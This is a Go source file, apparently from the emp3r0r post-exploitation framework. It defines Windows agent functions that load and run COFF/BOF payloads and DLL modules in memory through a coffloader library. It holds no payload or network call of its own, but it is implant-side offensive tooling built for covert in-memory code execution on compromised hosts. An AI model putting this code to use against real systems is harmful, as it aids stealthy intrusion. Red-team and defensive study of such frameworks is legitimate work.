//go:build windows

package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/modconfig"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// runCOFFModule executes a COFF/BOF payload on Windows via the in-memory
// COFFLoader dependency. The dependency is fetched on demand, mapped, called
// once, and unmapped by coffloader.RunCOFFDependency.
func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("runCOFFModule panic: %v", r)
			out = ""
		}
	}()

	if invocation.Coff == nil {
		return "", fmt.Errorf("missing COFF invocation data")
	}

	return coffloader.RunCOFFDependency(payload, invocation.Coff.Export, coffArgsFromInvocation(invocation), token)
}

// runDLLModule runs an in-memory DLL module (agent_config.type == "dll").
// dllData is the decompressed DLL image; the BOF payload is read from the
// agent-local/memfs path in invocation.DllFileValue. The DLL is loaded,
// used once, and unloaded by coffloader.RunWindowsCOFFViaDLL.
func runDLLModule(dllData []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
	if invocation.DllFileValue == "" {
		return "", fmt.Errorf("DLL module is missing its BOF file parameter")
	}

	bofData, err := util.ReadFileAgent(invocation.DllFileValue)
	if err != nil {
		return "", fmt.Errorf("reading BOF file %s: %w", invocation.DllFileValue, err)
	}

	entry := invocation.DllEntry
	if entry == "" {
		entry = "go"
	}

	return coffloader.RunWindowsCOFFViaDLL(dllData, bofData, entry, coffArgsFromInvocation(invocation), token)
}

// coffArgsFromInvocation converts resolved COFF args into the coffloader
// representation used by the DLL loader.
func coffArgsFromInvocation(invocation def.ResolvedInvocation) []coffloader.CoffArg {
	return modconfig.CoffArgsFromResolved(invocation.Coff)
}
